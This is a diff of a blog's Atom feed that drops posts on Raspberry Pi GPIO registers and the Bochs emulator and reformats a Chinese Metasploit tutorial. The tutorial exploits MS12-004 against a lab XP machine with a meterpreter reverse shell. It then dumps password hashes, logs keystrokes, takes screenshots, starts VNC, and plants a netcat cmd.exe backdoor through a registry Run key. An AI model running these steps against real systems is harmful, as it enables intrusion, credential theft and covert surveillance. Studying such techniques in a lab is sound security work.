-<p>4.GPLEV (GPIO Pin Level Registers)    GPLEV0、GPLEV1  给出相应GPIO Pin的值。</p>
-<p>5.GPEDS (GPIO Event Detect Status Registers)</p>
-<p>6.GPREN( GPIO Rising Edge Detect Enable Registers)</p>
-<p>7.GPFEN(GPIO Falling Edge Detect Enable Registers)</p>
-<p>8.GPHEN(GPIO High Detect Enable Registers )</p>
-<p>9.GPLEN( GPIO Low Detect Enable Registers)</p>
-<p>10.GPAREN(GPIO Asynchronous rising Edge Detect Enable Registers)</p>
-<p>11.GPAFEN(GPIO Asynchronous Falling Edge Detect Enable Registers)</p>
-<p>12.GPPUD(GPIO Pull-up/down Register)</p>
-<p>13.GPPUDCLK(GPIO Pull-up/down Clock Registers)</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;树莓派的共有54个GPIO 这54个GPIO通过 0x7e20 0000 - 0x7e20 00b0 这41 个寄存器控制 。有用的寄存器有：&lt;/p&gt;
-&lt;p&gt;1.GPFSEL ( GPIO Function Select)    共六个GPFSEL0 - GPFSEL6，每个GPFSEL控制10个GPIO pin ，即GPFSEL的0-29 bit 每3bit控制一个GPIO pin 30、31两个bit无用。作用是控制GPIO pin 的功能。 功能号：&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
-    
-    
-      <category term="GPIO" scheme="http://0x7c00.com/tags/GPIO/"/>
     
   </entry>
   
@@ -1125,156 +1180,52 @@
   </entry>
   
   <entry>
-    <title>Bochs</title>
-    <link href="http://0x7c00.com/2014/hello-world-2-2-2/"/>
-    <id>http://0x7c00.com/2014/hello-world-2-2-2/</id>
-    <published>2014-11-19T11:31:53.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
-    
-    <content type="html"><![CDATA[<p>刚刚编译好的新鲜Bochs出炉了。编译这个还真是费尽周折。先从Bochs官网下载win32 编译好的程序。打开发现竟然不能模拟80386CPU，可能是80386太古老了吧。 找了半天才在stackoverflow上看到要重新编译。下载源码，上传到RaspberryPi上加–enable-cpu-level=3  config。然后再弄到win上用VS2013编译。</p>
-<a id="more"></a>
-<p>加载最新的bios不兼容，下载了一个很旧的bochs版本在里面找到了bios镜像。可以运行我的MBR了。</p>
-<p>bochs 常用的命令：</p>
-<p># </p>
-<p>&nbsp;</p>
-<p>From here, you may use the following commands:</p>
-<div class="SECTION"><br><pre class="SCREEN">  c                           continue executing<br>  s     [count]               execute count instructions, default is 1<br>  Ctrl-C                      stop execution, and return to command line prompt<br>  Ctrl-D                      if at empty line on command line, exit<br>  q                           quit debugger and execution<br><br>  vb seg:off                  Set a virtual address instruction breakpoint<br>  lb addr                     Set a linear address instruction breakpoin<br>  pb     [<em>] addr             Set a physical address instruction breakpoin<br>  b      [</em>] addr<br>  info break                  Display state of all current breakpoints<br>  bpe    n                    Enable a breakpoint<br>  bpd    n                    Disable a breakpoint<br>  d      n                    Delete a breakpoint</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  watch r     addr            Insert a read watch point at physical address <code>addr</code><br>  watch w     addr            Insert a write watch point at physical address <code>addr</code><br>  watch                       Display state of current memory watchpoints<br>  watch stop                  Stop simulation when a watchpoint is encountered (default)<br>  watch continue              Do not stop simulation when a watchpoint is encountered<br>  unwatch addr                Remove watchpoint to specific physical address<br>  unwatch                     Remove all watch points<br>  trace-mem on/off            Enable/Disable memory access tracing</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  x  /nuf addr      Examine memory at linear address addr<br>  xp /nuf addr      Examine memory at physical address addr<br>     n              Count of how many units to display<br>     u              Unit size; one of<br>                      b Individual bytes<br>                      h Halfwords (2 bytes)<br>                      w Words (4 bytes)<br>                      g Giant words (8 bytes)<br>                      NOTE: these are <em>not</em> typical Intel nomenclature sizes,<br>                            but they are consistent with GDB convention.<br>     f              Printing format.  one of<br>                      x Print in hexadecimal<br>                      d Print in decimal<br>                      u Print in unsigned decimal<br>                      o Print in octal<br>                      t Print in binary<br><br>    n, f, and u are optional parameters.  u and f default to the last values<br>    you used, or to w(words) and x(hex) if none have been supplied.<br>    n currently defaults to 1.  If none of these optional parameters are<br>    used, no slash should be typed.  addr is also optional.  If you don’t<br>    specify it, it will be the value the next address (as if you had<br>    specified n+1 in the last x command).<br><br>  setpmem addr datasize val    Set physical memory location of size<br>                               datasize to value val.<br>  writemem                     dump a number of bytes of virtual memory starting from<br>                               the specified linear address into a file<br>  crc  addr1  addr2            Show CRC32 for physical memory range addr1..addr2</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  r|reg|regs|registers         List of CPU integer registers and their contents<br>  sreg                         Show segment registers and their contents<br>  dreg                         Show debug registers and their contents<br>  creg                         Show control registers and their contents<br>  info cpu                     List of all CPU registers and their contents<br>  info eflags                  Show decoded EFLAGS register<br>  info break                   Information about current breakpoint status<br>  set reg = expr<br>  trace on                    Disassemble every executed instruction. Note</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">                              that instructions which caused exceptions are<br>                              not really executed, and therefore not traced.<br>  trace off                   Disable instruction tracing.<br>  具体详见  <strong><a href="http://bochs.sourceforge.net/doc/docbook/" title="bochs documention" target="_blank" rel="external">bochs documention</a><br><br>2014年11月20日17:54:13 
- </strong> 第一个汇编函数可以运行了<br><img src="http://ccwyy.img43.wal8.com/img43/507648_20150116191603/142175554866.png" alt=""><br>    现在十一点半，顺利从磁盘加载512KB数据到内存0x20000-0x9ffff。本来想从0x10000处加载的，<br>可是在0x10000附近开始加载只能读大概61个扇区，然后就莫名其妙的进入死循环了。肯定和其实地<br>址有关，但是在附近换了个地址也只能读61扇区。 0x20000开始就没有问题了。莫名其妙。今天完成<br>了两个函数 printf 和 D2M 。还算顺利。<br><br></pre><br></div>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;刚刚编译好的新鲜Bochs出炉了。编译这个还真是费尽周折。先从Bochs官网下载win32 编译好的程序。打开发现竟然不能模拟80386CPU，可能是80386太古老了吧。 找了半天才在stackoverflow上看到要重新编译。下载源码，上传到RaspberryPi上加–enable-cpu-level=3  config。然后再弄到win上用VS2013编译。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
-    
-    
-      <category term="A32" scheme="http://0x7c00.com/tags/A32/"/>
-    
-      <category term="Bochs" scheme="http://0x7c00.com/tags/Bochs/"/>
-    
-      <category term="qemu" scheme="http://0x7c00.com/tags/qemu/"/>
-    
-      <category term="模拟器" scheme="http://0x7c00.com/tags/%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
-    
-      <category term="汇编" scheme="http://0x7c00.com/tags/%E6%B1%87%E7%BC%96/"/>
-    
-  </entry>
-  
-  <entry>
     <title>利用Metasploit进行渗透测试</title>
     <link href="http://0x7c00.com/2012/Penetration-testing-with-Metasploit/"/>
     <id>http://0x7c00.com/2012/Penetration-testing-with-Metasploit/</id>
     <published>2012-04-11T03:35:53.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
+    <updated>2017-05-08T18:31:13.827Z</updated>
     
-    <content type="html"><![CDATA[<p>声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。</p>
-<p>最近在玩Backtrack 5 ，就把最近学到的东西分享下。</p>
-<p>所有工具都是Backtrack 5 自带的，</p>
-<p>用到的工具 ： 大名鼎鼎的Metasploit Feamwork    还有 Netcat</p>
+    <content type="html"><![CDATA[<p><strong>声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。</strong><br>最近在玩Backtrack 5 ，就把最近学到的东西分享下,所有工具都是Backtrack 5 自带的，用到的工具 ： 大名鼎鼎的<code>Metasploit Feamwork</code>    还有 <code>Netcat</code></p>
+<p>要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。废话不说，看步骤 ：</p>
 <a id="more"></a>
-<p>要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。</p>
-<p>废话不说，看步骤 ：</p>
-<p>&nbsp;</p>
-<p>在控制台执行 msfconsole 启动Metasploit  ，</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/1.png" alt=""></p>
-<p>&nbsp;</p>
-<p>输入命令 search ms12_004，我们来找找ms12-004漏洞的利用模块</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/2.png" alt=""></p>
-<p>&nbsp;</p>
-<p>已经找到了，接下来使用该模块</p>
-<p>输入命令  Use exploits/windows/browser/ms12_004_midi</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/3.png" alt=""></p>
-<p>&nbsp;</p>
-<p>接下来输入命令 show options ，显示该漏洞的基本信息，以及要设置的参数</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/4.png" alt=""></p>
-<p>&nbsp;</p>
+<p>在控制台执行<code>msfconsole</code>启动Metasploit  ，<br><img src="http://pic.0x7c00.cn/metasploit/1.png" alt=""></p>
+<p>输入命令<code>search ms12_004</code>我们来找找ms12-004漏洞的利用模块<br><img src="http://pic.0x7c00.cn/metasploit/2.png" alt=""><br>已经找到了，接下来使用该模块</p>
+<p>输入命令  <code>use exploits/windows/browser/ms12_004_midi</code><br><img src="http://pic.0x7c00.cn/metasploit/3.png" alt=""><br>接下来输入命令 <code>show options</code> ，显示该漏洞的基本信息，以及要设置的参数<br><img src="http://pic.0x7c00.cn/metasploit/4.png" alt=""></p>
 <p>设置参数：</p>
-<p>输入命令 ： set  SRVHOST  192.168.42.139</p>
-<p>Set  PAYLOAD  windows/meterpreter/reverse_tcp</p>
-<p>Set  LHOST  192.168.42.130</p>
-<p>Set  URIOATH  /</p>
-<p>&nbsp;</p>
-<p>最后 再输入show options ，查看是否设置好</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/5.png" alt=""></p>
-<p>&nbsp;</p>
-<p>已经OK了，开始渗透。</p>
-<p>执行命令 ：Exploit</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/6.png" alt=""></p>
-<p>&nbsp;</p>
-<p>可以看到服务已经启动了，链接地址<a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a></p>
-<p>在用Xp打开恶意链接地址 <a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a></p>
-<p><img src="http://pic.0x7c00.cn/metasploit/7.png" alt=""></p>
-<p>&nbsp;</p>
-<p>BackTrack 开始渗透，</p>
-<p>这边BT5已经有反应了 ，渗透成功~</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/8.png" alt=""></p>
-<p>&nbsp;</p>
-<p>输入命令 Sessions</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/9.png" alt=""></p>
-<p>&nbsp;</p>
-<p>我们看到有一个会话，会话的 ID 是1  ，开打开这个会话</p>
-<p>输入命令 Sessions  -i  1 这时，我们已经进入了Meterpreter</p>
-<p>&nbsp;</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/10.png" alt=""></p>
-<p>&nbsp;</p>
-<p>Meterpreter 是一个很强大的 payload ， 具体说明输入 help 可以看到，</p>
-<p>Meterpreter  &gt;  hashdump     // 可以看到远程主机帐号和加密后的密码</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/11.png" alt=""></p>
+<p>输入命令 ：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span>  SRVHOST  192.168.42.139</div><div class="line">Set  PAYLOAD  windows/meterpreter/reverse_tcp</div><div class="line">Set  LHOST  192.168.42.130</div><div class="line">Set  URIOATH  /</div></pre></td></tr></table></figure></p>
+<p>最后 再输入<code>show options</code> ，查看是否设置好<br><img src="http://pic.0x7c00.cn/metasploit/5.png" alt=""></p>
+<p>已经OK了，开始渗透。<br>执行命令 ：<code>exploit</code><br><img src="http://pic.0x7c00.cn/metasploit/6.png" alt=""></p>
+<p>可以看到服务已经启动了，链接地址<a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a><br>在用Xp打开恶意链接地址 <a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a><br><img src="http://pic.0x7c00.cn/metasploit/7.png" alt=""></p>
+<p>BackTrack 开始渗透，<br>这边BT5已经有反应了 ，渗透成功~<br><img src="http://pic.0x7c00.cn/metasploit/8.png" alt=""></p>
+<p>输入命令 <code>sessions</code><br><img src="http://pic.0x7c00.cn/metasploit/9.png" alt=""></p>
+<p>我们看到有一个会话，会话的 ID 是1  ，开打开这个会话<br>输入命令 <code>sessions  -i  1</code> 这时，我们已经进入了Meterpreter<br><img src="http://pic.0x7c00.cn/metasploit/10.png" alt=""></p>
+<p>Meterpreter 是一个很强大的 payload ， 具体说明输入 help 可以看到，<br><code>meterpreter&gt; hashdump</code> // 可以看到远程主机帐号和加密后的密码<br><img src="http://pic.0x7c00.cn/metasploit/11.png" alt=""></p>
 <p>这里再说几个常用的Meterpreter  命令</p>
-<p>&nbsp;</p>
-<p>Meterpreter  &gt;  keyscan_start   //开启键盘记录</p>
-<p>&nbsp;</p>
-<p>Meterpreter  &gt;  heyscan_dump  //  查看键盘记录的内容</p>
-<p>Meterpreter  &gt;  keyscan_stop    //  关闭键盘记录</p>
-<p>Meterpreter  &gt;  shell   //看下图大家都懂的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt; keyscan_start   //开启键盘记录</div><div class="line">meterpreter&gt; heyscan_dump    //  查看键盘记录的内容</div><div class="line">meterpreter&gt; keyscan_stop    //  关闭键盘记录</div><div class="line">meterpreter&gt; shell           //看下图大家都懂的</div></pre></td></tr></table></figure>
 <p><img src="http://pic.0x7c00.cn/metasploit/12.png" alt=""></p>
-<p>Meterpreter  &gt; ps  //  获取远程主机进程列表，比windows自带的任务管理器清晰多了</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/13.png" alt=""></p>
-<p>Meterpreter  &gt; screenshot   //  截取远程桌面屏幕</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/14.png" alt=""></p>
-<p>Meterpreter  &gt; run vnc  // 开启远程主机vnc 服务</p>
-<p>过一会，可以看到桌面，并且可以控制鼠标和键盘</p>
+<p><code>meterpreter &gt; ps</code> //  获取远程主机进程列表，比windows自带的任务管理器清晰多了<br><img src="http://pic.0x7c00.cn/metasploit/13.png" alt=""></p>
+<p><code>meterpreter&gt;screenshot</code>//  截取远程桌面屏幕<br><img src="http://pic.0x7c00.cn/metasploit/14.png" alt=""></p>
+<p><code>meterpreter &gt; run vnc</code> // 开启远程主机vnc 服务<br>过一会，可以看到桌面，并且可以控制鼠标和键盘</p>
 <p><img src="http://pic.0x7c00.cn/metasploit/15.png" alt=""></p>
-<p>&nbsp;</p>
-<p>好，下来我们来留后门，方便以后常来 ~</p>
-<p>先上传 nc.exe（netcant）到windows的systen32文件夹下</p>
-<p>Upload   /pentest/windows-binaries/tools/nc.exe   c:\windows\system32</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/16.png" alt=""></p>
-<p>&nbsp;</p>
-<p>已经成功了，下来我们将nc.exe加到注册表，让他开机自启动</p>
-<p>&nbsp;</p>
-<p>先查看注册表</p>
-<p>Reg  enumkey  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/17.png" alt=""></p>
-<p>已经可以看到注册表键值了</p>
-<p>下来加入注册表</p>
-<p>Reg  setval  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run  -v  backdoor  -d  c:\windows\system32\nc.exe”-L  -d  -p  443  cmd.exe”</p>
-<p>（上面是一条命令）</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/18.png" alt=""></p>
-<p>提示成功，看看XP的注册表</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/19.png" alt=""></p>
-<p>已经有了这个键值</p>
-<p>我们重启远程主机试下</p>
-<p>输命令 reboot</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/20.png" alt=""></p>
-<p>由于远程主机已经关闭，显示链接断开 ，等xp重启后，我们试试留的后门</p>
-<p>Telnet   192.168.42.139   443</p>
-<p><img src="http://pic.0x7c00.cn/metasploit/21.png" alt=""></p>
-<p>已经连接成功了  : )  .。刚接触BT5，各位见笑了  … 论坛有玩B5或者 Metasploit 的朋友可以联系我，求交流。</p>
+<p>好，下来我们来留后门，方便以后常来 ~<br>先上传 nc.exe（netcant）到windows的systen32文件夹下<br>Upload   /pentest/windows-binaries/tools/nc.exe   c:\windows\system32<br><img src="http://pic.0x7c00.cn/metasploit/16.png" alt=""></p>
+<p>已经成功了，下来我们将nc.exe加到注册表，让他开机自启动<br>先查看注册表</p>
+<p><code>reg enumkey  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run</code><br><img src="http://pic.0x7c00.cn/metasploit/17.png" alt=""></p>
+<p>已经可以看到注册表键值了<br>下来加入注册表</p>
+<p><code>reg  setval  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run  -v  backdoor  -d  c:\windows\system32\nc.exe&quot;-L  -d  -p  443  cmd.exe&quot;</code><br><img src="http://pic.0x7c00.cn/metasploit/18.png" alt=""></p>
+<p>提示成功，看看XP的注册表<br><img src="http://pic.0x7c00.cn/metasploit/19.png" alt=""></p>
+<p>已经有了这个键值<br>我们重启远程主机试下</p>
+<p>输命令 <code>reboot</code><br><img src="http://pic.0x7c00.cn/metasploit/20.png" alt=""></p>
+<p>由于远程主机已经关闭，显示链接断开 ，等xp重启后，我们试试留的后门<br>Telnet   192.168.42.139   443</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/21.png" alt=""><br>已经连接成功了  : )  .。刚接触BT5，各位见笑了  … 论坛有玩B5或者 Metasploit 的朋友可以联系我，求交流。</p>
 <p>QQ :791628659</p>
-<pre><code>By  Breaker
-</code></pre><p>本文地址<a href="http://blog.0x7c00.cn/?p=165" target="_blank" rel="external">http://0x7c00.cn/?p=165</a></p>
-<p>2012年4月10日11:34:16</p>
+<p>本文地址<a href="http://0x7c00.cn/2012/Penetration-testing-with-Metasploit/" target="_blank" rel="external">http://0x7c00.cn/2012/Penetration-testing-with-Metasploit/</a><br>2012年4月10日11:34:16</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。&lt;/p&gt;
-&lt;p&gt;最近在玩Backtrack 5 ，就把最近学到的东西分享下。&lt;/p&gt;
-&lt;p&gt;所有工具都是Backtrack 5 自带的，&lt;/p&gt;
-&lt;p&gt;用到的工具 ： 大名鼎鼎的Metasploit Feamwork    还有 Netcat&lt;/p&gt;
+      &lt;p&gt;&lt;strong&gt;声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。&lt;/strong&gt;&lt;br&gt;最近在玩Backtrack 5 ，就把最近学到的东西分享下,所有工具都是Backtrack 5 自带的，用到的工具 ： 大名鼎鼎的&lt;code&gt;Metasploit Feamwork&lt;/code&gt;    还有 &lt;code&gt;Netcat&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。废话不说，看步骤 ：&lt;/p&gt;
     
     </summary>
     
